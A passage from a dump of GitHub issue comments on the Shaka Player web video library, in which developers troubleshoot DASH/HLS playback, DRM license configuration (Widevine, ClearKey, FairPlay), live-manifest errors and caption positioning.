returns an empty array on both phones.\nAlso tried to reset DRM on the phones settings.\nThis is really confusing, I'll try to find another phone today to do further test. I was initially trying to fix a play issue on our \"shaka based player\" located at : http://artestudio.biz.st/player/demo.html and http://artestudio.biz.st/player/demo-noskin.html which reproduce the same problem under shaka 2.0.0-beta and shaka 2.0.0-beta2.\nThese warnings appears in the logs on both Android and desktop, but stream plays well on desktop.\n\nshaka-player.compiled.js:65 \nrequestMediaKeySystemAccess() is deprecated on insecure origins in the specification. Support will be removed in the future. You should consider switching your application to a secure origin, such as HTTPS. See https://goo.gl/rStTGz for more details.\nshaka-player.compiled.js:65 \nIt is recommended that a robustness level be specified. Not specifying the robustness level could result in unexpected behavior in the future, potentially including failure to play.\ncontentType strings without codecs will not be supported by requestMediaKeySystemAccess() in the future. Please specify the desired codec(s) as part of the contentType.\n. Closing this issue, tried with a Alcatel one touch idol 3 under Android 6.0 and everything worked as expected, there must be a - huh... confusing - problem with my 2 others devices.\n\nThank you for your answers.\nSimon\n. Just in case someone is looking for the information, to get rid of the warning, I used SW_SECURE_CRYPTO for both audioRobustness and audioRobustness, valid values for widevine are listed here : https://chromium.googlesource.com/chromium/src/+/refs/heads/lkcr/components/cdm/renderer/widevine_key_system_properties.h\n. Thanks !. ",
    "chetanshelake": "Hello friend,\nShaka player repository is a great repository for html5 player. I have integrate shaka player in my website and it work fine.\nI have some issues with that -\n1. I am unable to display buffer progress bar.\n2. confused about\n     - if video played to some duration like 1 or 2 min and i try to start from first then it start again buffering but this content already buffered from server.\n      How can i avoid re-streaming for each video? \n      I have search much more related that but i can't found any solution \n     if any one have solution related that please help me\nThank & regards \nchetan shelake\n. ",
    "ArhiChief": "Hi. \nThanks for response.\nAs I understand, you synchronize time only for first MPD, and part of segments from MPD must be loaded and played, but if we have incorrect time while loading page with player, shaka throws error just after first mpd loaded.\n. Oh, thanks. We will update our software, make some test and tell you results.\n. Looks like it works. I'd add  inside MPD element of my manifests. Thank you.\n. Hi, issue really fixed up! thanks a lot!\n. ",
    "xhwang-chromium": "Thanks joeyparrish for the tips. I tried it but it seems shakaDemo isn't defined:\nUncaught ReferenceError: shakaDemo is not defined(...)\n. I was clicking the \"demo app\" link you provided above.\n. Thanks! I tried it. After exiting sleep mode, the video paused for a few seconds, and finally resumes to play. But after a while it stopped again.\nSo it's improved, but seems still need to polish.\n. Could you please try the latest M52/M53 build which should have a fix\nhttps://codereview.chromium.org/2072843002 in Chrome on this issue? If it\nworks well, then this issue should be marked as wontfix :)\nOn Wed, Jul 13, 2016 at 9:29 AM, Joey Parrish notifications@github.com\nwrote:\n\nI re-tested this on the nightly build. Here's what I did:\n1. Load nightly build\n   http://nightly.shaka-player-demo.appspot.com/demo/ on Chrome on Mac\n2. Choose \"Sintel 4k\" and start playback\n3. Wait about 30 seconds\n4. Close the laptop\n5. Wait 2 minutes\n6. Open the laptop\nPlayback continues, with audio initially playing catching up to a still\nvideo frame. After that, video plays in sync. (I imagine this catch-up\nphase has something to do with Chrome's media pipeline on OSX, but it's\ndefinitely outside the control of Shaka.)\nPlayback does not, however, continue to the end of the stream. At some\npoint, it stops. Not sure why. I haven't looked at the Network panel in the\ndeveloper tools, nor have I tried this with verbose logging.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/352#issuecomment-232410563,\nor mute the thread\nhttps://github.com/notifications/unsubscribe/AJssXnVJC6rQ0gJ-gGWTbgv9kF0rgC_sks5qVRJ-gaJpZM4IN9tz\n.\n. \n",
    "publicocean0": "no i mean another thing:\nin my case i have to fragmenting webm using javascript on the fly and i pass it directly to Mediasource.\ndash is not used by my code. \nSo i searching code as example for fragmenting webm .\nAnyway i have question. \nIf i undederstand correctly fragmentation split file in chunk following the format of file.\nSegmentation is used by Dash for defining MPD.\nWhat is the logic of MPD? \n. Thanks for your explanation \n. yes another question please .... in the past i realized  my player but i m thinking to pass to shaka. But there is a problem. My player uses a customized datasource for retrieval chunks ... \nis there a manual or source example or other for make easy to understand how to implement a additional datasource ?. No it doesnt use dash specifications but custom specification and it retrieves data in different way ...There is a generic prototype Stream  class permitting to handle streams of data , to seek in a specific offset. I have my class retrieving chunks from network , but i might integrate it in shaka player.. yes i think. I will read this documentation for having a better idea about\nit.\nThanks for your support :)\n2017-05-31 19:23 GMT+02:00 Joey Parrish notifications@github.com:\n\nWe have many plugin interfaces you may want to explore:\nhttps://shaka-player-demo.appspot.com/docs/api/tutorial-plugins.html\nManifest parser plugins\nhttps://shaka-player-demo.appspot.com/docs/api/tutorial-manifest-parser.html\nwould allow you to source your media metadata from something other than\nDASH or HLS. We don't care where the info comes from, but we need metadata\nin a certain format to allow us to generically stream the content and feed\nit to the browser using MediaSource.\nNetworking plugins\nhttps://v2-1-2-dot-shaka-player-demo.appspot.com/docs/api/lib_net_http_plugin.js.html#line35\nallow you to provide data from a source other than HTTP. You register your\nplugin to handle a certain URI scheme, and Shaka Player will invoke your\nplugin any time it wants data from a URI using that scheme. For example,\nyou could ask Shaka to load media from myapp://foo/bar, and we would\ninvoke the \"myapp\" plugin to get the actual data.\nDoes this help?\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/835#issuecomment-305257747,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ACZspL543JcKVJb3vRc9jDhUf9lBqVtXks5r_aIlgaJpZM4NrC0x\n.\n. \n",
    "JimmyVV": "if you use mpd files to play webm on dash, the latency is so large. there is some other idea to reduce the latency? not only reduce the length of mpd file. like httpflv, using http chuked to dynamically download mediasegment and play?. ",
    "boredom2": "Hi there. Thanks a lot for that detailed explanations.\nEspecially that manifest.dash approach was very helpfull.\nSadly, it wont be that easy :)\nI am able to get now the License Server URL from the manifest (Thanks!).\nAnd I already configured the registerRequestFilter - but there is never a ReqestType.LICENSE.\nI am not sure, why.\nThe keySystem Information is:\n<sea:SegmentEncryption schemeIdUri=\"urn:mpeg:dash:sea:aes128-cbc:2013\">\n<sea:KeySystem keySystemUri=\"urn:mpeg:dash:sea:keysys:http:2013\">\nSHAKA for sure does not know that KeySystem, so I declared in the config.manifest.dash.customScheme Callback:\nconfigs=[];\nconfigs.push({\n    keySystem:'org.w3.clearkey',\n    licenseServerUri:\"manifest derived License Server URL\",\n...\n});\nreturn(configs);\nIs it possible that there is no LICENSE Request, because SHAKA does not recognize the Manifest as ClearKey-secured? Or do you have any idea how to force SHAKA to perform this Request? :)\nThanks!\nChristoph\n. Thanks fot that hint, seems like im learning a lot with this case :) \nI can confirm, that there is indeed no \"cenc:pssh\" element in the MPD - so I will have to create an initData Override. I do see the documentation of that Attribute on your Api Docs and also your linked code - but everything is referencing a non-existing page (https://w3c.github.io/encrypted-media/initdata-format-registry.html#registry). So maybe you have any kind of example or template I can use for that?\n. I am not convinced, that AES Encryption is really fun, especially, if MS is not really declaring, how to deal with it :)\nOk, the situation is like the following. Within the MPD (e.g. this one: \"http://nexxplayplus1.streaming.mediaservices.windows.net/d9ccfb03-5bf8-42cc-bd98-e235b147fd80/73656_src.ism/Manifest(format=mpd-time-csf)\") - we find these Protection Informations;\n<sea:SegmentEncryption schemeIdUri=\"urn:mpeg:dash:sea:aes128-cbc:2013\">\n<sea:KeySystem keySystemUri=\"urn:mpeg:dash:sea:keysys:http:2013\">\n<sea:CryptoPeriod keyUriTemplate=\"https://wamsamsclus001kd-hs.cloudapp.net/?KID=ef07d917-5c6e-45d2-8ce2-28abac2a4e35\" IV=\"0x29EB6D7A6EC2B30AB04DC63C2E4F010E\">\nMicrosoft considers the \"KID\" Attribute of the KeyUriTemplate as Key IDs - so I took them and constructed some initData - but sadly, no success. Shaka is still not willing to make any License Call.\nForthermore - I am still not sure, if this could be really considered as \"clearkey\" Encrytpion at all.\nThe target ist, that the License Call will go to this keyUriTemplate where I will add a specific header token (which is given by our backend) . The License Call will, once accepted, then return another Key/Token, which should be used in order to decrypt the stream. \nMicrosoft states though, that the \"IV\" value should also be used in order to decrpyt the stream, but is not telling anywhere, how.\ndash:{\n                                customScheme:function(node){\n                                    var configs=[];\n                                    var keyIds=[];\n                                    for(var i=0;i<node.childNodes.length;++i){\n                                        var child=node.childNodes[i];\n                                        if(child.nodeName=='sea:CryptoPeriod'){\n                                            var u=child.getAttribute('keyUriTemplate'); //this will be the License Server ID\n                                            keyIds.push(u.split('=')[1]); // assuming, that the KID value is the Key ID we will need. What is with \"IV\"?\n                                        }\n                                    }\n                                    var initDataString=JSON.stringify({kids:keyIds});\n                                    var initData=new Uint8Array(initDataString.length);\n                                    for(var i=0;i<initDataString.length;++i){\n                                        initData[i]=initDataString.charCodeAt(i);;\n                                    }\n                                    configs.push({\n                                        keySystem:'org.w3.clearkey',\n                                        licenseServerUri:u,\n                                        distinctiveIdentifierRequired:false,\n                                        persistentStateRequired: false,\n                                        audioRobustness: '',\n                                        videoRobustness: '',\n                                        serverCertificate: null,\n                                        initData: {\n                                            initDataType:'keyids',\n                                            initData:initData\n                                        }\n                                    });\n                                    return configs;\n                                }\n                            }\nAlthough we are in close contact with MS directly, its hard even for them to give us a correct answer how to dig this out correctly - which is quite sad actually :)\nWho can we hire to make this work? :P \nI know, this is a very specific question, but maybe someone from the experts here have an idea, how all this should be combined?\nThanks a lot!\n. Sharp eyes :) I changed that to Array.\nNow I get Error 6006 - FAILED_TO_GENERATE_LICENSE_REQUEST, which is consistent, due to the fact, that I still dont see any License Call...\nI additionally see the Error details \"couldnt parse init data\". I double checked that. An Array should be correct, the initDataType is correct and according to your documentation, initData must be an UInt8Array. This Array is present with 49 items currently, when taking the \"KID\" Attribute from above. I also tried with adding the \"IV\" Attribute as KeyId also or only using the \"IV\" Attribute.\nAlways the same error - \"couldnt parse init data\".\n. Wow, you are indeed right (all browsers latest version on Windows 10).\nNormally I use Firefox (V47) for Development - and there, init data is indeed not parseable (same in MS Edge).\nIn Chrome (V50) - I do see a License Request! But there is also an error coming up (Reference Error: request is not defined at Array. at X.request).\nThats really interesing, seems like there are differences at that level in different browsers.\n. Hello again, I really tried to get this uncompiled version running, but I permanently get \"shaka.Player is not a constructor\" after getting from npm and following your code in /demo. Is there anything else, that is necessary to run the player uncompiled except \n<script src=\"third_party/closure/goog/base.js\"></script>\n    <script src=\"dist/deps.js\"></script>\n    <script src=\"shaka-player.uncompiled.js\"></script>\nAs always - thanks a lot for your time!\nChristoph\n. Thats correct - but we are talking about the V2 Beta Version?\n. Hahahha, yes, you are right. I didnt know, that the Syntax of 1.* and 2.* is that close. The NPM was indeed 1.6.5 - my fault, sorry for that.\nThe \"not-parseable\" initData Error on Firefox now has a Stack:\n\"shaka.util.Error@.../npm/node_modules/shaka-player/lib/util/error.js:77:13shaka.media.DrmEngine.prototype.createTemporarySession_/<@.../npm/node_modules/shaka-player/lib/media/drm_engine.js:653:19\"\nIn Chrome though, its more complex:\n\"Error: Shaka Error MEDIA.VIDEO_ERROR (4,) at new shaka.util.Error (.../npm/node_modules/shaka-player/lib/util/error.js:77:13) at shaka.Player.onVideoError_ (.../npm/node_modules/shaka-player/lib/player.js:1482:17)\"\nWhich then leads to \"Assertion failed! Wrong error type!\" on player.js:383\nAnd taking all of this into consideration - I am still not sure (are you?) that \"clearkeys\" is really the right way to handle AES Encryption - and even if, if I am using the right keyids.\n. Hi, I do really appreciate all your help for sure :)\nThe problem is - nobody really is familiar with this \"AES Encryption\" and although we work closely with Microsoft, they also cannot really give me technical insights in how to do that correctly - its really a shame :)\nDue to the fact, that they call this \"Common Envelope Encryption\", I do suspect, that \"ClearKey\" is the right way to do that - but thats just my guess.\nI added an MPD File above, you can use it, its just for testing purposes:\nhttp://nexxplayplus1.streaming.mediaservices.windows.net/d9ccfb03-5bf8-42cc-bd98-e235b147fd80/73656_src.ism/Manifest(format=mpd-time-csf)\nThanks a lot!\n. Hi there - we are now also finally under Pressure to run a DRM Solution for Safari asap.\nI am really a little confused :) We have Assets in HLS and with FairPlay Protection ready.\nInitially, I thought, that Safari will handle the Process itself, but looks, like if we have to do something here :) So Apple DRM also works on MSE Base?\nAnd if yes, I suggest, this will only work with HLS (DASH with FairPlay is afaik not possible to create or at least never done and for sure not possible to create on MS Azure).\nSo can you maybe give me a little Hint on how to make this work?\nDid someone ever made HLS+FairPlay+MSE work at all?\n(and if you know that - how does this work on iOS, if this does not support MSE?). Thanks for that Information - I will try once SHAKA can handle the slightly \"crippled\" HLS Manifest, that we get from MS Azure CDN. I will update then here :). Thanks for your comment.\nWe decided to handle this on the Backendside and present the necessary Parts to the Player itself.\nNevertheless, I will take a look at the dash_parser for that. You never know, maybe we change our minds again :)\n. Thats indeed a good advice :)\nThe Stream seems to have a problem (or maybe thats common with Live?) in 2.0 beta 1/2/3.\nIn Beta 1, there is really an error thrown (\"next segment does not exist\").\nIn Beta 2 and 3, no error is shown, but its permanently lookking for the currentPeriod.startTime.\nIn 1.6.5, it is wokring (there is a hint in the console - availibilityStartTime seems to be inaccurate, some segments may not be available yet), but the Stream is showing.\nIts maybe likelely, that the CDN changed something in the way, they create the MPD - I know it was working with Beta 2 (and I think, even with Beta 3) the last week.\nGood question is now - is the Manifest \"not valid\" (or not really valid), and SHOULD be rejected by SHAKA or is it just slightly inappropriate, so that it can be supported? I cannot judge that, thats out of my Scope - but I would be happy to make it work again - unless you say, that the Manifest is really damaged, then Ill go back to the Client.\nThanks a lot for you (as always) fast and friendly support!\nThanks,\nChristoph\n. Yes, it will be. Its a 24-7 permanent LiveStream - feel free to use it as Testing Case :)\nAnd thanks for the insights!\n. Hello again - so, this Manifest is not valid in terms of DASH Specifications or more an Edge Case, that wont be taken care of due to Code Complexity? I just ask, because I have to tell the CDN to correct that :)\n. I understand and that makes absolutely Sense :)\n. Hi there, sorry - you are right, I should have used the Template (was too early for me :P).\nI can reproduce this Issue also on your Demo Page - but not with all Manifests. The YouTube Manifests run fine, the Azure Media Services Trailer has the same Effect. Due to the fact, that we are also using Azure Media Services heavily - there might be the Problem.\nI use: Firefox 49.02 on Windows 10, Anniversary Update with all available Updates.\nThe Connection is a 7MBps Connection - not extremely fast, but for sure fast enough to run YT HD nearly without Delay, so that shouldnt be an Issue...\n\n. Perfect, thanks!. I see, thanks for the quick reply - as always:-))). Thanks for looking into this. Thats the default HLS Output from Microsoft Azure Media Services - who would have thought, that they make it so difficult :). Thanks!. Hi again,\nyes I know, this seems to be a Microsoft Invention to apply some HLS Technology to DASH. This \"AES Encryption\" (https://docs.microsoft.com/en-us/azure/media-services/media-services-protect-with-aes128 seems to come from HLS. An AES encoded HLS Stream can be played directly in iOS/Safari (not using SHAKA, just usking video src) - as long as the Key is \"simple\" (given in the HLS Metadata).\nMS decided obviously to use this Technology also on all other Streaming Formats (they handle it in SS themselves somehow and somehow they added that to DASH - but thats clearly proprietary). I talked to the MS Azure Europe Guys last Week and they said, DASH.IF is supporting this now - but I think, it is clearly beycond my Scope how this works in Details.\nSumming it up - I would really like to have that Feature enabled in SHAKA - but I think, this must be discussed with MS in details, my knowledge about the internals is clearly limited.\nI can ask Microsoft though to talk to you, if you like :). Hi there,\nthanks for your fast Response. Yes, you are right, sorry for the http/s Error ehre :)\nAnd No, its not Audio-Only :)\nPlease help me understand, because obviously, I dont know enough. Isnt it possible to playback HLS Files with MSE on all Browsers? Or am I wrong here? I thought, when interpreting HLS, SHAKA would allow me to also playback HLS in all Browsers? So there is no Way to playback HLS on Firefox for example?\nIf thats the Case - sorry for my Misunderstanding.. Thanks a lor for this Clarification, that explains everything.\n. Thanks for your Efforts!. Thanks for these Insights - and yes, I understand, that there are potentially completely different desired Behaviours, no doubt about that. Ill stay tuned :). Thanks for these Insights - and yes, I understand, that there are potentially completely different desired Behaviours, no doubt about that. Ill stay tuned :). This is outstandingly awesome and absolutely brillant :)\nI love it and its working for our Case as if it was designed for exactly this Purpose.\nThanks a lot!. Concerning the mentioned \"best Ways\" to use SHAKA together with a \"VAST/VPAID/IMA\" Environment (i.e. the optimal Way to change the Source of a  between a SHAKA Instance and a simple Ad-MP4, which may be handled by the Player itself (own VAST Approach) or the IMA SDK (or potential other Ad Plugins) and back to SHAKA with the same time (or maybe a little before) - is it currently planned to cover all that unter a Plugin/Interface or how would you do this most efficiently with SHAKA 2.4 right now? (I noticed, that you postponed that to 2.5, but I was still curious :P).\nThe Reason why I ask is the more-and-more present Behaviour  of more-and-more Browsers to not-start Videos, that are created by Script, but only due to a User Gesture. Although I understand the Reasons, we used to work with 2 Video Instances on top of each other to maintain SHAKA under the Ad-Player. We still do this in some Cases, but I would prefer an approach within one  Tag, Im just not sure, what you would consider as best appraoch here to make the permanent switch between various Video Sources as easy and fast as possible?\nThanks a lot!. Oh really?\nOk, I just thought, I dont have enough Knowledge here...\nBut fine, Ill try to let the Stream on as long as possible...\nAs always, thanks a lot!. Just as an Update. mux.js has been updated yesterday to v4.4.0.. Thanks, I didnt know about jsDelivr - copied :). We put the 2.3.1 Builds to Production already and i can confirm - no Issues there:-). Hi there.\nThanks for that - I can load it in FireFox now.\nBut the Result is like in our Player - permanent Loading and Updating, but no Playback anymore (cannot find Segment).\nSo is this a SHAKA-related Problem then?. Hi there.\nThanks for your Analysis and yes - due to the Fact, that this was a LiveStream, I couldnt let it up \"forever\", its a Stream from our Clients. It is also right - \"Level3\" (the german Outlet of the US Century Link CDN) uses Wowza here, and I knew, that this would make Problems :)\nI can arrange another Session tomorrow if this would help find out whats wrong here. Would this be helpfull?. Hi there. Good Timing.\nWe had a long Conversation with the CDN and they accepted that the Caching was not optimally configured. Their latest Stream run completely in 2.3.1 today - so far, I would say - SHAKA is doing well :)\nThanks again for these in-depth Analysis!. Although Chrome for Android supports PiP by default, this API is currently in no released Browser exposed or available. There is only an automatic PiP by Android, when leaving the Browser while playing a Fullscreen Video - and there is nothing to do from Developer Side to activate this Feature. Additionally, there is the iOS PiP API, but thats iOS-specific and has nothing to do with a real Standard API (just like their \"Fullscreen\" Nightmare :P).\nI am a big Fan of PiP too and would love to integrate this API into our Player Solutions, but so far, thats only a Draft without any real-world Example.. I wished it would be supported, but Safari uses the iOS-way (webkitPresentationMode). I would also say, that this is off-topic for SHAKA as Engine (but a very interesting Topic :P).. Can someone please help me finding out, how exactly the Situation for IE11 is currently?\nAs far as I can see, it is not supported on IE11 on Windows 7 or lower.\nOn Windows 10 (which I run), it works fine with 2.3.3.\nThe Homepage on Git here mentions a seperate PolyFill, that is needed - but is it needed already? And for what? Due to the Fact, that it runs fine currently, I dont see the need for a PolyFill?\nThanks for the Clarifications,\nChristoph. Thanks for Explanation.\nI also understand now, why 2.3.3 works in our Player in IE11 without including this Polyfill.\nObviously, we include a Promise PolyFill ourselves also :)\nThanks a lot!. Yeah, I saw this Configuration, but I would prefer to disable all SHAKA Handling of Captions at all - in all other Aspects, I would like to give everything to SHAKA, but not here :) We also handle Tons of Videos in MP4/WEBM Formats without DASH/HLS and also cover Tons of Ads via VAST and VPAID, where all Kinds of Exceptions and Special Caption Treatment is necessary. \nAdditionally, we use our Players also on iOS - where SHAKA can sadly not help (yet). So for a consistent Treatment, we will take care of all this ourselves.\nIs there a Way to create a TextRenderer, which stops all Text Handling at all (which is probably not really, what it was built for, I agree :P).. If I am also allowed to answer - definetely the \"Pre-load API\". That would make so much Sense when playing Playlists or short Bumpers one after the other. In these Contexts, its not even speculative, its absolutely sure, that this Video will come next.. Hi,\nas always, thanks for your in-depth Analysis.\nNevertheless, \n\nthis Call is initiated by \"unknown\" and of Type \"Media\" - I am very uncertain, what this means :)\nand of course, I dont expect that you debug our Application Code :)\nI just have no Idea, how this can happen and it only occurs, when Shaka is involved. In Scenarios without Shaka (iOS, progressive-Play on older Browsers etc), this does not come up at all.. I was able to remove this Behaviour, although the Reason is still unclear, it is gone now by disabling EventListeners on the Media Object while detaching. \nThanks your Time though!. ",
    "maxbykov": "Thank you for your response. Unfortunately, we observed this issue in Chrome, I think the EME engine throws an error on getting mp4/video;avc1.42c028,mp4a.40.2 in case of the example manifest during requestMediaKeySystemAccess where it expects only video codecs to be part of the videoCapabilities.\n. How would you estimate the chances that Shaka will support parsing SubRepresentation in the future? I mean, the missing piece is there, we are just not getting it. Or is it feasible to implement splitting the codecs string by audio/video category and then fulfilling videoCapabilities/audioCapabilities accordingly?\n. Thank you, this is helpful.\n. So, it seems like this issue might be resolved only by adding support for SubRepresentation from where information about each component might be extracted.\nIf so, could we consider this issue as a feature request and get an approximation on feasibility or, ideally, timeframe for it? Based on that we can make an internal decision on supporting such multiplexed format from our side.\nThank you.\n. Thank you Joey\n. @joeyparrish thank you for the update\n. Duplicate of issue https://github.com/google/shaka-player/issues/403\n. ",
    "john-turner": "We are building the shaka player as part of our clojurescript project via lein-cljsbuild. our closure compilation is using google closure and referencing the shaka-player as a libs shaka-player/lib\nWe have the following closure configuration variables set:\noptimizations advanced\nclosure-extra-annotations {\"listens\" \"exportDoc\"}\n\"COMPILED\" true\n\"goog.DEBUG\" false\n\"goog.STRICT_MODE_COMPATIBLE\" true\n\"goog.ENABLE_DEBUG_LOADER\" false\n\"shaka.asserts.ENABLE_ASSERTS\" false\n\"shaka.log.MAX_LOG_LEVEL\" \"0\"\n \"GIT_VERSION\" \"1.3.0\"\n. Thanks for you help. There is definitely something wrong with the COMPILED flag and the compiler. I will try to resolve it and post a reference if I find anything that would help someone else with a similar build issue.\nThanks\n. ",
    "UmeshWOI": "Yes,Thank you !!!\n\nUmesh Kumath\nEngineer, Software Development\nDirect Tel: +91 22 6680 1628\nBoard Tel: +91 22 6680 1515\n201, Tower II,  SEEPZ++, SEZ,\nAndheri (East), Mumbai 400 096, INDIA.\nwww.geemedia.com\nOn Wed, May 4, 2016 at 6:02 PM, Joey Parrish notifications@github.com\nwrote:\n\nError 6001 is 'REQUESTED_KEY_SYSTEMS_UNAVAILABLE', defined in\nlib/util/error.js and documented at\nhttp://shaka-player-demo.appspot.com/docs/api/shaka.util.Error.html. The\ndocs say:\nNone of the requested key systems are available. A license server URI is\nrequired; so this may also happen if the key systems do not have a license\nserver URI.\nI also recommend reading the DRM Configuration tutorial:\nhttp://shaka-player-demo.appspot.com/docs/api/tutorial-drm-config.html\nDoes that answer your question?\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub\nhttps://github.com/google/shaka-player/issues/365#issuecomment-216846427\n. \n",
    "dobrusev": "Hello,\nI'm sorry for the delayed response. Yes it's still an issue! Here is a manifest url:\nhttp://teststreams.livesport-massive.com/out/u/DASH-unencrypted.mpd\n. Thank you @joeyparrish for you quick and detailed response. \n. I'm using DASH with Widevine and I see the same behavior - hiccuping  in chrome.\nSometimes I see glitches during playback as well. \nWhen I compare I have a better performance without glitches on the old version of shaka.\nI agree with Yair. It will be nice if there is a solution in the default configuration that can be made for better performance.\n. That was fast!\nThanks Joey Parrish.\nI will try it now and update you guys here.\n. After retesting I don't see any hiccuping in chrome. And the switches between the video tracks is smooth.\nAgain thanks for the great work!\n. many thanks @joeyparrish for your detailed explanation.\nI will forward this to the encoder vendor.\n. many thanks @joeyparrish for your detailed explanation.\nI will forward this to the encoder vendor.\n. I have an issue with DASH + Widevine Live stream that player make requests for the segment with segment number -1 and the response from the server of course is 404.\n@joeyparrish  Can the reason for that be temporary stream unavailability as well?. Hi @joeyparrish I think adding restrictions to the AbrManager is good idea.\nI was looking into a way how to change BANDWIDTH_UPGRADE_TARGET_ in SimpleAbrManager to value I think fits best to my streams specifics. I have a few design restrictions and implementing custom abrManager is not an option for me.\nJust a few questions:\n\nIs there a way how SimpleAbrManager to be parametrized to be able to set BANDWIDTH_UPGRADE_TARGET_? \nIs there a way to add BANDWIDTH_UPGRADE_TARGET_, BANDWIDTH_DOWNGRADE_TARGET_ and SWITCH_INTERVAL_MS to abr restrictions? \nIs there a way how to use maxBandwidth to influence chooseVideoStream_ algorithm? \n\nThank you in advance!. @joeyparrish thank you very much!. @joeyparrish I provide you manifest from another DC that doesn't play with the test player.\nAfter \"recreating\" the manifest the link that I previously provided started working for me as well.\nWe want to get to the bottom of the issue because we want to make sure that all the manifests are playing.\nregards. @joeyparrish I provide you manifest from another DC that doesn't play with the test player.\nAfter \"recreating\" the manifest the link that I previously provided started working for me as well.\nWe want to get to the bottom of the issue because we want to make sure that all the manifests are playing.\nregards. AWS Elemental Delta is the Packager. \nI forwarded the results from your investigation to the content provider.\nThank you once again for the fast and accurate response!. AWS Elemental Delta is the Packager. \nI forwarded the results from your investigation to the content provider.\nThank you once again for the fast and accurate response!. I will ask the content provider to make the content available again.. I will ask the content provider to make the content available again.. @joeyparrish That's the answer that I got: \n\"We can give you an un-encrypted endpoint but the stream will work?\nWe tried, and we can't recreate the issue, that's why it was hard to see what was going on, it was just a one off. We can give you a copy of the incorrect manifest?\". @joeyparrish That's the answer that I got: \n\"We can give you an un-encrypted endpoint but the stream will work?\nWe tried, and we can't recreate the issue, that's why it was hard to see what was going on, it was just a one off. We can give you a copy of the incorrect manifest?\". ",
    "asdftu": "\nadjust machine time 5 minutes ahead.\nplay http://wowzaec2demo.streamlock.net/live/bigbuckbunny/manifest_mpm4sav_mvtime.mpd\n. OK, Thanks very much! \ni will test it.\n. i am sure that i am using an clean version ofmaster.\n\nmy platform is :\nOS: windows 10\nPython 2.7\n. thanks Joe,\nI finally found it was the stream issue. the stream i used use 4 bytes int value indicates how long the string was. i had informed the stream provider to fix their issue.\nthanks very much.. ",
    "jdalton": "Does this still repro in Edge 16 (or 17 preview)?. ",
    "zouhir": "Tested on Edge17 preview, The video link that @FedeOmoto has reported works with no issues.\nMore tests on Edge 17 preview:\n\u2705 Shaka: works and tested, supports 4K! here.\n\u2705 Dash.js: works and tested here.\n\u2705 Bitdash: works and tested here.\nOnly problem would be if you have unsupported encryption which is unrelated to the library.\nI think it is safe to close this issue!. I have tested the page included in the internal bug report referenced with ID 14554354 and it seems to be working on Edge 17 preview\nI will be setting something up to reproduce this the external bug https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/12658991/ -- since I read above they are pretty related, hopefully that one will be resolved too..\nI am keeping my eye on this.... ",
    "johnpallett": "This is related to #997 . ",
    "iamprem": "@eipporko were you able to make this work for widevine DRM videos in chrome? I'm planning to capture video frames of DRM protected using webGL and send it to server in my application.. ",
    "mediadevtech": "please, tell me what does the gap exactly mean? in case of attached testing datasets each period in manifest has it's own init segment.\n. ",
    "bbert": "Hi,\nIs it possible to share information you got from Apple to make HLS+FP playback working?\nGuidelines from WWDC15's presentation (https://developer.apple.com/videos/play/wwdc2015/502/) seems not to be enough. Especially if a certificate is required.. Hi,\nDo you have some news on this issue?\nI have done some tests on 2 different mobiles phones, of the same brand and with the same Android version (4.4.4).\nIn one case the video is decrypted and played, but in the other case I have the same error (DecryptingDemuxerStream: no decryptor).\n. With chrome 56, the issue is still present and identical. . On my side, I reproduced the issue with MP4 assets, especially with \"Tears of Steel (Widevine)\". ",
    "sandeep-mirpuri": "@joeyparrish @sarge any updates on this?. @joeyparrish really need this fix. We have the same requirement as @chrisfillmore. Until you guys push 2.3, are there any suggestions on something we can do with the current APIs to mock the effect of it not buffering, so users don't see frames changing constantly? Thanks :). @joeyparrish That's fantastic! Thanks.. @TheModMaker yes you are right. My overrides are intentionally removing the attributes because it places the cues better. The reason I feel that it may not be being parsed correctly is because of what the resulting VTT cue properties look like. Unfortunately I can't share the content. It is protected. But I can tell you what specs are coming in from the TTML.\nSo in the TTML we get - \ntts:origin = \"10% 10%\", tts:extent = \"80% 80%\", displayAlign = \"after\"\nWhich basically means that there should be a text track container 80% height and width, centered in the video container and the text should be displayed at the bottom of this container. However, based on the TTML parser code this translates to - \ncue.size = 80, cue.position = 10, cue.line = 10, cue.snapToLines = false\nWhich explains why it looks like it does in the screen shot. I am not sure if this is correct and I feel like the displayAlign makes all the difference. So while VTT cues do not support all the properties of TTML, I was wondering if there is a better solution than removing the TTML attributes and forcing it to \"auto\"?. @TheModMaker is it possible to add an option to default to the auto if the browser doesn't support VTTRegion and the developer does not necessarily want to implement a custom text renderer?. Thanks guys. @joeyparrish yes that is the gist of it @TheModMaker @chrisfillmore when the number of pieces to get the content becomes many the potential of particular tracks erroring out, where others don\u2019t, gets higher. We ingest VOD content from our customers or ingest and convert live streams directly from broadcasters into VOD content. And our app makes all of these available. There are often server side ads inserted into the VOD content. All our content is on multiple origins which are behind Akamai. So there are so many places where something can go wrong and a particular track might not get written out properly or when inserting ads there may be an issue. While I agree the chances are few and we need to be fixing the conversion or ingestion algorithms that are screwing up, in the meantime we need to make sure that streaming doesn\u2019t fail for a user on VOD or LIVE if it so happens that one track didn\u2019t get written to the origin correctly\n@TheModMaker thanks for your advice on extending shakas abr manager. I was able to work that out and hack something together. So I am not in as much of a sticky situation as 3 days ago. But I feel like a more robust solution within shakas abr manager would be more desirable in the long run than my hack.\nAnd it just can\u2019t be said enough, thanks to everyone working on Shaka! It is still by far one of the best players and very usable and customisable.. @joeyparrish @michellezhuogg I am working on getting the permissions to share the required URLs to test this with you. Until then I can describe the scenario more accurately based on my investigation.\n1) Player loads the manifest\n2) Period 1 doesnt require a license so it loads it and marks all variants as \"allowedByKeySystem: true\"\n3) Player encounters the need for a license in Period 2\n4) Player makes license request and successfully receives key\n5) DRM Engine kicks in and experiences a \"keystatuseschange\" event and fires onKeyStatusesChange_ callback\n6) This schedules the keyStatusTimer_ which calls processKeyStatusChanges_ which calls playerInterface_.onKeyStatus\n7) From what I can see, the onKeyStatus_ callback is the one that reevaluates the variants with the new restrictions imposed by the license\n8) However, when the license is acquired and these callbacks are fired, the player is still in period 1 and it runs the filters on the variants for period 1, which are clear and have no keyIds associated, so they are all allowed again.\n9) But the variants for period 2 which need to be filtered never are because the keyStatusChange event is not fired again and the filters are not run on the variants of period 2\nI don't know if this helps any more, but 